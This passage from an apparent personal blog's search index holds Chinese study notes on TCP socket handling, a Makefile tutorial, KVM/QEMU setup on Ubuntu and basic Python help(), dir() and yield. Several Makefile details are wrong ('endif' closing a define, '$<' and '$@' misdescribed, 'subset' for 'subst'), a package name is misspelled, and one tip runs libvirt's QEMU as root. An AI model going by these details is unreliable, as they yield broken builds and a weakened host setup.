title="套接字"></a>套接字</h4><p>调用listen向套接字写入等待信息，执行accept时，服务器端一般都处于包等待状态。连接时，创建一个等待连接的套接字的副本，写入连接对象等控制信息，并与客户端套接字连接在一起。</p><p>复制出一个新套接字之后，原来那个处于等待状态的套接字还会以等待状态继续存在。</p><p>关键点就是每次为新的连接创建新的套接字。</p><p>端口号是用来识别套接字的，新创建的套接字副本必需和原来等待连接的套接字具有相同的端口号。</p><p>以下四种信息判断套接字：</p><ul><li>客户端IP地址</li><li>客户端端口号</li><li>服务器IP地址</li><li>服务器端口号</li></ul><p>套接字中记录了当前时间点哪个程序正在与哪个对象进行通信。</p><p>应用程序之间使用描述符来指代套接字。</p><p>使用描述符来指代套接字的原因：</p><ul><li>等待连接的套接字中没有客户端的IP地址和端口号</li><li>使用描述符这一信息比较简单</li></ul><h4 id="光电信号转换为数字信号"><a href="#光电信号转换为数字信号" class="headerlink" title="光电信号转换为数字信号"></a>光电信号转换为数字信号</h4><p>电信号和光信号转换为数字信号：</p><ol><li>检测同步信号</li><li>延长时钟信号</li><li>分离时钟信号</li></ol><h4 id="IP模块处理数据包"><a href="#IP模块处理数据包" class="headerlink" title="IP模块处理数据包"></a>IP模块处理数据包</h4><p>协议栈的IP模块会检查IP头部：</p><ol><li>判断是不是发给自己的</li><li>判断网络包有没有分片</li><li>将包转发给TCP或UTP模块</li></ol><h4 id="TCP模块处理数据包"><a href="#TCP模块处理数据包" class="headerlink" title="TCP模块处理数据包"></a>TCP模块处理数据包</h4><p>如果收到的是发起连接的包，则TCP模块会：</p><ol><li>确认TCP头部的控制位SYN</li><li>检查接收方的端口号</li><li>为相应的等待连接的套接字复制一个新的副本</li><li>记录发送方的IP地址和端口号等信息。</li></ol><p>收到数据包：</p><ol><li>根据收到的包的发送方的IP地址、发送方端口号、接收方IP地址、接收方端口号找到相应的套接字</li><li>将数据块拼合起来并保存在接受缓存区</li><li>想客户端返回他ACK号</li></ol><p>断开连接，两边都可以发起，这里为服务器端：</p><ol><li>调用Socket库的close，TCP生成FIN为1的头部</li><li>客户端接收后返回一个ACK，然后调用close，生成FIN为1的TCP头部发送给服务器</li><li>服务器返回ACK</li></ol><h3 id="Web服务器程序解释请求消息并做出响应"><a href="#Web服务器程序解释请求消息并做出响应" class="headerlink" title="Web服务器程序解释请求消息并做出响应"></a>Web服务器程序解释请求消息并做出响应</h3><p>Web服务器公开的目录是虚拟目录。</p><p>文件名转换。</p><h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><p>常用在会员制的信息服务。<br>主要有以下3种：</p><ul><li>客户端IP地址</li><li>客户端域名</li><li>用户名和密码</li></ul><p>查询域名：</p><ol><li>协议栈将发送方的IP告知给Web服务器</li><li>服务器生成查询消息到最近的DNS服务器</li><li>DNS服务器找出负责管辖该IP的DNS服务器并转发查询消息</li><li>DNS服务器返回查询到的域名</li></ol><h4 id="返回响应"><a href="#返回响应" class="headerlink" title="返回响应"></a>返回响应</h4><p>调用Socket库的write，将响应消息交给协议栈，并通过使用套接字描述符告知这个消息该发送给谁。</p><h5 id="判断显示的数据类型和编码方式"><a href="#判断显示的数据类型和编码方式" class="headerlink" title="判断显示的数据类型和编码方式"></a>判断显示的数据类型和编码方式</h5><p>Content-Type类型</p><p><img src="/media/16523998935740.png"></p><p>charset表示编码方式。</p><p>Content-Encoding，转换方式。</p><h4 id="浏览器显示内容"><a href="#浏览器显示内容" class="headerlink" title="浏览器显示内容"></a>浏览器显示内容</h4><p>实际的显示操作是由操作系统来完成的，浏览器负责对操作系统发出指令。</p><h1 id="整体图"><a href="#整体图" class="headerlink" title="整体图"></a>整体图</h1><p><img src="/media/16524182951589.png"></p><p><img src="/media/16524182951170.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>跟我一起写 Makefile</title>
    <link href="/2022/08/25/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99%20Makefile/"/>
    <url>/2022/08/25/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99%20Makefile/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>makefile可以指定那些文件需要先编译，那些文件需要后编译，那些文件需要重新编译。</p><p>makefile像shell脚本，可以执行操作系统的命令。</p><p>作用：自动化编译。</p><p>make是一个命令工具，用来解释makefile中的指令。</p><hr><h2 id="2-介绍"><a href="#2-介绍" class="headerlink" title="2 介绍"></a>2 介绍</h2><p>make的编译规则，以c文件和头文件为例：</p><ol><li>若这个工程没有编译过，那么所有的c文件都要编译并被链接。</li><li>若这个工程的某几个c文件被修改，那么只编译被修改的c文件，并链接目标程序。</li><li>若这个工程中的头文件被改变了，那么需要编译引用了这几个头文件的c文件，并链接目标程序。</li></ol><hr><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><pre><code class="hljs">target ...: prerequisites    command    </code></pre><p>command前一定要以一个<mark>tab键开头</mark>。</p><p>target是目标文件，prerequisites是源文件，也就是所谓的依赖文件，command就是shell命令，就是在命令行中编译的那一套命令。</p><p>基本规则就是，当prerequisites相较于target更新时，执行command。</p><hr><h3 id="判断更新的原理"><a href="#判断更新的原理" class="headerlink" title="判断更新的原理"></a>判断更新的原理</h3><p>通过比较target文件和prerequisites文件的<mark>修改日期</mark>，来判断是否执行command。</p><hr><h3 id="依赖关系的实质"><a href="#依赖关系的实质" class="headerlink" title="依赖关系的实质"></a>依赖关系的实质</h3><p>说明目标文件是由那些文件生成的。</p><hr><h3 id="定义命令"><a href="#定义命令" class="headerlink" title="定义命令"></a>定义命令</h3><p>在target后面没有prerequisites，也就是冒号之后什么都没有。</p><p>要执行命令，就需要显示的使用<code>make label</code>, 如</p><pre><code class="hljs">clean :    rm edit main.o kid.o    </code></pre><p>就需要用<code>make clean</code>来执行。</p><hr><h3 id="如何工作"><a href="#如何工作" class="headerlink" title="如何工作"></a>如何工作</h3><ol><li>在当前目录下寻找<code>makefile</code>或<code>Makefile</code>文件。</li><li>以文件中的第一个target为最终的目标文件。</li><li>如果edit文件不存在，或是后面的依赖修改时间更新，那么会执行命令</li><li>如果edit文件的依赖不存在，就会寻找依赖并生成<br>…</li></ol><hr><h3 id="在makefile中使用变量"><a href="#在makefile中使用变量" class="headerlink" title="在makefile中使用变量"></a>在makefile中使用变量</h3><p>作用：便于维护，只需要修改一个地方，就可以把文件中所有使用到该变量的值修改。</p><p>如在makefile中一开始定义：</p><pre><code class="hljs">objects = main.o kid.o command.o</code></pre><p>和其他语言中的变量有些许不一样。</p><p>使用</p><pre><code class="hljs">edit : $(objects)    cc -o edit $(objects)clean :    rm edit $(objects)    </code></pre><hr><h3 id="利用make的自动推导功能"><a href="#利用make的自动推导功能" class="headerlink" title="利用make的自动推导功能"></a>利用make的自动推导功能</h3><pre><code class="hljs">main.o : defy.h</code></pre><p>会自动把<code>main.c</code>写进依赖，并自动推导出<code>cc -c main.c</code>.</p><p>发现头文件并不需要写到command中，应该是因为头文件会在c文件中展开。</p><hr><h3 id="用于清空目标文件的规则"><a href="#用于清空目标文件的规则" class="headerlink" title="用于清空目标文件的规则"></a>用于清空目标文件的规则</h3><p>每一个Makefile中都应该写一个清空目标文件的规则。</p><pre><code class="hljs">.PHONY : cleanclean :    -rm edit $(objects)    </code></pre><p><code>.PHONY</code>表示<code>clean</code>是一个“伪目标”。</p><p>有一个减号<code>-</code>表示，当某些文件出现问题时，继续完成后面的事。</p><p>clean一般放在文件的最后。</p><hr><h3 id="Makefile组成"><a href="#Makefile组成" class="headerlink" title="Makefile组成"></a>Makefile组成</h3><ol><li>显示规则，指出要生成的文件、文件的依赖和生成的命令。</li><li>隐晦规则，自动推导。</li><li>变量定义，多为字符串。</li><li>文件指示，引用另一个makefile，指定有效部分，定义多行命令。</li><li>注释，#</li></ol><hr><h3 id="指定特定的Makefile"><a href="#指定特定的Makefile" class="headerlink" title="指定特定的Makefile"></a>指定特定的Makefile</h3><pre><code class="hljs">make -f Make.linux</code></pre><p>或者</p><pre><code class="hljs">make —-file Make.ATX</code></pre><hr><h3 id="引用其他Makefile"><a href="#引用其他Makefile" class="headerlink" title="引用其他Makefile"></a>引用其他Makefile</h3><pre><code class="hljs">include filename</code></pre><p>如</p><pre><code class="hljs">include foo.make a.my b.my c.mk</code></pre><p>使用<code>-I</code>或<code>—-include-dir</code>参数，指定目录寻找。</p><p>让make不理会无法读取的文件，从而继续执行, 添加<code>-</code></p><pre><code class="hljs">-include filename</code></pre><hr><h3 id="环境变量MAKEFILES"><a href="#环境变量MAKEFILES" class="headerlink" title="环境变量MAKEFILES"></a>环境变量MAKEFILES</h3><p>make会把这个变量的值做一个类似include的动作。</p><hr><h2 id="3-书写规则"><a href="#3-书写规则" class="headerlink" title="3 书写规则"></a>3 书写规则</h2><p>可以把command和前面的写成一行</p><pre><code class="hljs">targets : prerequisites ; command</code></pre><p>命令或其他的句子太长可以用<code>\</code>分隔换行</p><pre><code class="hljs">objects = main.o kid.o command.o display.o \insert.o search.o file.o utility.o</code></pre><p>一般，make以<code>/bin/sh</code>执行命令。</p><hr><h3 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符"></a>使用通配符</h3><p>支持三个通配符：<code>*</code>,<code>?</code>,<code>~</code></p><hr><h3 id="文件搜寻"><a href="#文件搜寻" class="headerlink" title="文件搜寻"></a>文件搜寻</h3><h4 id="VPATH变量"><a href="#VPATH变量" class="headerlink" title="VPATH变量"></a>VPATH变量</h4><p>Makefile中的<code>VPATH</code>变量，指定目录查找，当make在当前目录中没有查找到时，到指定目录中查找</p><pre><code class="hljs">VPATH = src:../headers</code></pre><p>使用<code>:</code>分隔。</p><h4 id="vpath关键字"><a href="#vpath关键字" class="headerlink" title="vpath关键字"></a>vpath关键字</h4><p>三种使用方法</p><ol><li>vpath <pattern> <directories></li><li>vpath <pattern></li><li>vpath</li></ol><p><pattern>需包含<code>%</code>字符，表示<br>匹配0或多个字符。</p><h3 id="伪目标"><a href="#伪目标" class="headerlink" title="伪目标"></a>伪目标</h3><p>使用<code>.PHONY</code>显式表明其为<code>伪目标</code>，作用是避免和文件重名。</p><pre><code class="hljs">.PHONY : cleanclean :    rm *.o temp    </code></pre><p>表明要运行clean就需要执行<code>make clean</code>.</p><p>目标和伪目标都可以成为依赖。</p><hr><h3 id="多目标"><a href="#多目标" class="headerlink" title="多目标"></a>多目标</h3><p>当多个目标依赖于同一个文件时。</p><p>使用自动化变量<code>$@</code>, 表示当前规则中所有的目标的集合。</p><pre><code class="hljs">bigoutput little output: text.g    generate text.g -$(subset output,,$@) &gt; $@    </code></pre><p><code>$</code>表示执行一个函数，<code>subset</code>是函数名，<code>output,,$@</code>是参数。</p><hr><h3 id="静态模式"><a href="#静态模式" class="headerlink" title="静态模式"></a>静态模式</h3><p>更容易定义多目标的规则。</p><p>语法：</p><pre><code class="hljs">&lt;targets&gt;: &lt;target-pattern&gt;: &lt;prereq-patternn&gt;    &lt;command&gt;    </code></pre><p>如</p><pre><code class="hljs">objects = foo.o bar.o    all: $(objects)$(objects): %.o: %.c    $(CC) -c $(CFLAGS) $&lt; -o $@    </code></pre><p>依赖的名称来源于目标文件前的名称。</p><p>中间的<code>%.o</code>表示筛选尾缀为<code>.o</code>的目标。</p><p><code>$&lt;</code>和<code>$@</code> 是自动化变量。</p><p><code>$&lt;</code>表示所有的依赖目标集(这里是foo.c bar.c).</p><p><code>$@</code>表示所有的目标集(这里是foo.o bar.o)</p><h3 id="自动生成依赖"><a href="#自动生成依赖" class="headerlink" title="自动生成依赖"></a>自动生成依赖</h3><p>使用GNU C&#x2F;C++编译器的<code>-MM</code>选项。</p><p><code>.d</code>文件包含<code>.c</code>文件的依赖关系。</p><pre><code class="hljs">source = foo.c bar.cinclude $(source:.c=.d)</code></pre><p>做替换，把变量source中所有 .c 字符串替换为 .d </p><h2 id="4-书写命令"><a href="#4-书写命令" class="headerlink" title="4 书写命令"></a>4 书写命令</h2><p>注释的符号是<code>#</code>这个和shell脚本一样高。</p><p>make 一般使用环境变量SHELL中定义的Shell来执行。</p><p>make默认由&#x2F;bin&#x2F;sh执行。</p><h3 id="显示命令"><a href="#显示命令" class="headerlink" title="显示命令"></a>显示命令</h3><p>使用<code>@</code>在命令之前，命令将不会被打印在屏幕上。</p><p>调试Makefile，使用make的<code>-n</code>或<code>—-just-print</code>参数，只会打印命令而不会执行。</p><p>make的<code>-s</code>或<code>—-silent</code>或<code>—-quiet</code>参数，表示禁止命令的显示。</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>让后续命令在前面起作用之后执行，要用分号隔离开。</p><pre><code class="hljs">exec:    cd /home/hchen; pwd    </code></pre><h3 id="命令出错"><a href="#命令出错" class="headerlink" title="命令出错"></a>命令出错</h3><p>忽略命令的出错, 使用<code>-</code></p><pre><code class="hljs">clean:    —rm -f *.o    </code></pre><p>也可以使用make的参数<code>-i</code>或<code>—-ignore-errors</code>.</p><p>或者使用<code>.IGNORE</code></p><p>终止出错的规则，继续执行其他规则的参数<code>-k</code>或<code>—-keep-going</code></p><h3 id="嵌套执行"><a href="#嵌套执行" class="headerlink" title="嵌套执行"></a>嵌套执行</h3><p>总控Makefile.</p><p>SHELL和MAKEFLAGS变量总是会传递给下层。</p><p><code>-w</code>和<code>—-print-directory</code>参数，打印目前工作目录信息。p</p><h3 id="定义命令包"><a href="#定义命令包" class="headerlink" title="定义命令包"></a>定义命令包</h3><p>以<code>define</code>开头，<code>endif</code>结束。</p><pre><code class="hljs">define run-yaccyacc $(firstword $^)mv y.tab.c $@endif</code></pre><p>使用命令包</p><pre><code class="hljs">foo.c: foo.y    $(run-yacc)    </code></pre><h2 id="5-使用变量"><a href="#5-使用变量" class="headerlink" title="5 使用变量"></a>5 使用变量</h2><p>Makefile中定义的变量类似于C&#x2F;C++中的宏。</p><p>变量命名，可以包含字符、数字、下划线(可以用数字开头)，不应该含有 <code>: # =</code>或空字符。大小写敏感。</p><p>使用<code>:=</code>操作符，前面的变量不能使用后面的变量过，避免无限重复定义。</p><p>注意注释符<code>#</code>的特性</p><pre><code class="hljs">dir := /foo/bar     #directory</code></pre><p>dir这个变量的值是<code>/foo/bar</code>后面跟了四个空格。</p><p><code>?=</code>操作符</p><pre><code class="hljs">FOO ?= bar</code></pre><p>如果FOO没有被定义，那么其值为bar。</p><h3 id="变量的高级用法"><a href="#变量的高级用法" class="headerlink" title="变量的高级用法"></a>变量的高级用法</h3><p>替换。</p><p>把变量的值当作变量。</p><h3 id="追加变量值"><a href="#追加变量值" class="headerlink" title="追加变量值"></a>追加变量值</h3><p>使用<code>+=</code>.</p><hr><h3 id="override指示符"><a href="#override指示符" class="headerlink" title="override指示符"></a>override指示符</h3><hr><h2 id="make的运行"><a href="#make的运行" class="headerlink" title="make的运行"></a>make的运行</h2><p>一般makefile中都包含了编译、安装、打包等功能。</p>]]></content>
    
    
    <categories>
      
      <category>Make</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker 学习</title>
    <link href="/2022/08/25/Docker-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/25/Docker-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="http://coolshell.cn/articles/17010.html">网博客1</a><br><a href="http://coolshell.cn/articles/17049.html">网博客2</a><br><a href="http://coolshell.cn/articles/17061.html">网博客3</a><br><a href="http://coolshell.cn/articles/17200.html">网博客4</a></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kvm, libvirt 和 qemu</title>
    <link href="/2022/08/25/kvm-libvirt-%E5%92%8C-qemu/"/>
    <url>/2022/08/25/kvm-libvirt-%E5%92%8C-qemu/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>KVM 是 Kernel base Virtual Machina 的简称.</p><p>QEMU 是 quick emulator 的简称.</p><h1 id="Ubuntu-上使用"><a href="#Ubuntu-上使用" class="headerlink" title="Ubuntu 上使用"></a>Ubuntu 上使用</h1><h2 id="查看是否支持虚拟化"><a href="#查看是否支持虚拟化" class="headerlink" title="查看是否支持虚拟化"></a>查看是否支持虚拟化</h2><p>使用:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-attribute">LC_ALL</span>=C lscpu |grep Virtualization<br></code></pre></td></tr></table></figure><p>若输出 <code>Virtualization:         VT-x</code> 即可。</p><p>或:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">grep</span> -Eoc <span class="hljs-string">&#x27;(vmx|svm)&#x27;</span> <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure><p>输出大于0的数字.</p><h2 id="查看是否支持硬件加速"><a href="#查看是否支持硬件加速" class="headerlink" title="查看是否支持硬件加速"></a>查看是否支持硬件加速</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ sudo apt <span class="hljs-keyword">install</span> cpu-checker<br></code></pre></td></tr></table></figure><p>输入:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>kvm-ok<br></code></pre></td></tr></table></figure><p>若输出为:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">KVM acceleration can be used</span><br></code></pre></td></tr></table></figure><p>即表明支持。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> sudo apt install qemu qemu-kvm libvirt-deamon-<span class="hljs-keyword">system</span> libvirt-client virt-manager virtinst bridge-utils<br></code></pre></td></tr></table></figure><p>安装软件:</p><ul><li>qemu-kvm, 为 KVM 管理程序提供硬件仿真</li><li>libvirt 管理虚拟机和其他虚拟化功能的软件集合, 其包含一个 API 库，一个守护进程 (libvirtd) 和一个命令行工具 (virsh)</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>需把镜像文件放在 <code>/var/lib/libvirt/images</code> 中。</p><p>需要在 <code>virt-manager</code> 中添加一个叫做 <code>network</code> 的网络连接。</p><p>先创建一个虚拟机磁盘的镜像:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> qemu<span class="hljs-literal">-img</span> create <span class="hljs-operator">-f</span> qcow2 archlinux.qcow2 <span class="hljs-number">40</span>G<br></code></pre></td></tr></table></figure><p>通过脚本创建虚拟机:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sudo virt-install <span class="hljs-attr">--name</span> archlinux <span class="hljs-attr">--os-variant</span>=archlinux <span class="hljs-attr">--memory</span> <span class="hljs-number">4096</span> <span class="hljs-attr">--vcpus</span> <span class="hljs-number">2</span> <span class="hljs-attr">--disk</span> path=./archlinux<span class="hljs-selector-class">.qcow2</span>,size=<span class="hljs-number">20</span> <span class="hljs-attr">--cdrom</span>=/var/lib/libvirt/images/archlinux-<span class="hljs-number">2022.08</span>.<span class="hljs-number">05</span>-x86_64<span class="hljs-selector-class">.iso</span>  <span class="hljs-attr">--boot</span> loader=/usr/share/qemu/OVMF<span class="hljs-selector-class">.fd</span> <span class="hljs-attr">--virt-type</span> kvm <span class="hljs-attr">--network</span> network=network,bridge=virbr1<br></code></pre></td></tr></table></figure><p>部分选项说明:</p><ul><li>–name, 创建虚拟机名称</li><li>–os-variant, 创建虚拟机类型</li><li>–memory, 虚拟机的内存大小</li><li>–vcpus, 虚拟机的 CPU 数量</li><li>–cdrom, 虚拟机的 CD, 可接 ISO 镜像路径</li><li>–disk path, 指定虚拟机硬盘路径</li><li>–disk path, 指定虚拟机硬盘大小，单位为 G</li><li>–boot, 指定启动的 BIOS, Archlinux 只支持 UEFI 启动</li><li>–virt-type, 选择 hypervisor, 如 kvm, qemu, xen 等</li><li>–network, 添加网卡</li></ul><p>若遇到 <code>cannot access storage file (as uid:107, gid:107) permission denied</code> 类似的报错, 修改 <code>/etc/libvirt/qemu.comf</code> 文件中:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># user = <span class="hljs-string">&quot;root&quot;</span></span><br><br><span class="hljs-meta"># group = <span class="hljs-string">&quot;root&quot;</span></span><br></code></pre></td></tr></table></figure><p>改为:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-attribute">group</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span><br></code></pre></td></tr></table></figure><p>若遇到 <code>You will need to grant the &#39;libvirt-qemu&#39; user search permissions for the following directories</code> 报错，是 <code>libvirt-qemu</code> 用户没有当前 qemu 文件所在位置用户的权限，将 <code>libvirt-qemu</code> 添加到当前的用户组即可, 即修改 <code>/etc/group</code> 文件。</p><h2 id="正式安装注意"><a href="#正式安装注意" class="headerlink" title="正式安装注意"></a>正式安装注意</h2><p>貌似必须得创建 <code>/boot</code> 分区。</p><h2 id="进入虚拟机后的配置"><a href="#进入虚拟机后的配置" class="headerlink" title="进入虚拟机后的配置"></a>进入虚拟机后的配置</h2><p>在设置里面搜索 “Display Configuration” 可以修改分辨率。</p><h1 id="ArchWiki-中关于-KVM-部分"><a href="#ArchWiki-中关于-KVM-部分" class="headerlink" title="ArchWiki 中关于 KVM 部分"></a>ArchWiki 中关于 KVM 部分</h1><p><a href="https://wiki.archlinux.org/title/KVM">ArchWiki 相关</a><br>KVM 是基于内核的虚拟机, 是内置于 Linux 内核的 hypervisor.</p><p>KVM 是 QEMU 的一种特殊的运行模式, 这种模式通过内核模块使用 CPU 扩展进行虚拟化.</p><p>需检查模块是否加载.</p><h2 id="Virtio-准虚拟化"><a href="#Virtio-准虚拟化" class="headerlink" title="Virtio 准虚拟化"></a>Virtio 准虚拟化</h2><p>准虚拟化为客户机提供了一种使用主机上设备的快速有效的通信方式.</p><p>KVM 使用 Virto API 作为虚拟机管理程序和客户端之间的连接层, 为虚拟机提供虚拟化设备.</p><p>所有 Virtio 设备都包括两部分, 主机设备和客户机驱动程序.</p><p>需检查模块是否加载.</p><h1 id="ArchWiki-中关于-QEMU-部分"><a href="#ArchWiki-中关于-QEMU-部分" class="headerlink" title="ArchWiki 中关于 QEMU 部分"></a>ArchWiki 中关于 QEMU 部分</h1><p>Qemu 是一个广泛使用的开源计算机模拟器和虚拟机.</p><p>作为虚拟机时, QEMU 可以使用其他虚拟机管理程序 (如 Xen 或 KVM) 来使用 CPU 扩展 (HAV) 进行虚拟化. 通过主机 CPU 上直接执行客户机代码来获得接近于宿主机的性能.</p><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>安装 <code>qemu</code> 包.</p><p>QEMU 不提供管理虚拟机的 GUI. 也不提供创建具有已保存设置的持久虚拟机的方法, 除非已创建自定义脚本以启动虚拟机, 否则必须在每次启动时在命令行上指定虚拟机的所有参数.</p><h2 id="创建新虚拟系统"><a href="#创建新虚拟系统" class="headerlink" title="创建新虚拟系统"></a>创建新虚拟系统</h2><h3 id="创建硬盘镜像"><a href="#创建硬盘镜像" class="headerlink" title="创建硬盘镜像"></a>创建硬盘镜像</h3><p>除非直接从 CM-ROM 或网络引导, 运行 QEMU 时都需要硬盘镜像 (一个文件, 存储虚拟机硬盘上的内容).</p><p>raw 镜像, 和客户机器上看到的内容一模一样.</p><p>qcow2 格式, 仅当客户系统实际写入内容的时候, 才会分配镜像空间.</p><p>QEMU 提供 <code>qemu-img</code> 命令来创建硬盘镜像.</p><p>也可以用 <code>dd</code> 或 <code>fallocate</code> 命令来创建一个 raw 镜像.</p><h1 id="HAV"><a href="#HAV" class="headerlink" title="HAV"></a>HAV</h1><p><a href="https://en.wikipedia.org/wiki/Hardware-assisted_virtualization">Wiki 百科</a><br>HAV 是 Hardware-assisted virtualization 的简称.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kde, kwin 和 krunner</title>
    <link href="/2022/08/25/kde-kwin-%E5%92%8C-krunner/"/>
    <url>/2022/08/25/kde-kwin-%E5%92%8C-krunner/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>解决使用 startx 命令后无法更换壁纸</title>
    <link href="/2022/08/25/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-startx-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%97%A0%E6%B3%95%E6%9B%B4%E6%8D%A2%E5%A3%81%E7%BA%B8/"/>
    <url>/2022/08/25/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-startx-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%97%A0%E6%B3%95%E6%9B%B4%E6%8D%A2%E5%A3%81%E7%BA%B8/</url>
    
    <content type="html"><![CDATA[<p>无法在 <code>gnome-tweaks tool</code> 管理界面中更换，但可以直接在设置里面更换，或者右键更换。</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中查看模块或函数的文档</title>
    <link href="/2022/08/24/Python-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E6%88%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%87%E6%A1%A3/"/>
    <url>/2022/08/24/Python-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E6%88%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<p>常见的查询函数有 help(), dir() 和 print().</p><h1 id="使用-help"><a href="#使用-help" class="headerlink" title="使用 help()"></a>使用 help()</h1><p>首先进入交互界面并输入 <code>help()</code>:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl">$ python3<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">help</span>()</span><br></code></pre></td></tr></table></figure><p>就会出现:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span>&gt;<br></code></pre></td></tr></table></figure><p>输入 modules, 就会显示所有的模块:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span>&gt; modules<br></code></pre></td></tr></table></figure><p>若查看某一个函数，在 Python 交互界面下:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">help</span>(requests.get)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>输入具体的 modules name, 就可以查看. 输入 <code>q</code> 可以退出。</p><h1 id="使用-dir"><a href="#使用-dir" class="headerlink" title="使用 dir()"></a>使用 dir()</h1><p>同样在 Python 的交互界面，需要先 <code>import</code> 再查看:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> requests</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">dir</span>(requests)</span><br></code></pre></td></tr></table></figure><p>会显示该模块的所有关键词。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中的 yeild 的用法</title>
    <link href="/2022/08/24/Python-%E4%B8%AD%E7%9A%84-yeild-%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <url>/2022/08/24/Python-%E4%B8%AD%E7%9A%84-yeild-%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>可以把 yield 视为 return. 但是，带有 yeild 的函数会被当做一个生成器，而不再是一个普通函数。</p><p>这个函数可以与 <code>next()</code> 函数配合使用，在下一次执行时会沿着上一次 yeild 停止处开始。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 的 logging 库</title>
    <link href="/2022/08/24/Python-%E7%9A%84-logging-%E5%BA%93/"/>
    <url>/2022/08/24/Python-%E7%9A%84-logging-%E5%BA%93/</url>
    
